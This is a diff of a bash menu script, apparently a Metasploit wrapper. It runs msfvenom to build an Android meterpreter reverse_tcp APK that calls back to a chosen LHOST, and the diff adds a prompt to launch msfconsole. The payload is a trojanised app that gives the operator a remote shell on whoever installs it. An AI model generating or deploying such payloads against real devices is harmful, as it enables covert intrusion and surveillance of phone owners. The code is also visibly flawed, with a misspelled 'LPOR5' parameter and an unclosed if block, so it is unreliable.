@@ -35,7 +35,11 @@ if [[ $option == 2 ]]; then
  echo -e "\e[1;97m(+) \e[1;91menter apk name with apk extension "
  read apk
  msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPOR5=$lport R > /sdcard/$apk
-bash metasploit.sh
+ read -p " Do you want to start metasploit-framework y/n :" start
+ if [[ $start == y ]]; then
+ msfconsole
+ elif [[ $start == n ]]; then
+ bash metasploit.sh
 elif [[ $option == 1 ]]; then
 echo " Starting Metasploit Framework "
 msfconsole
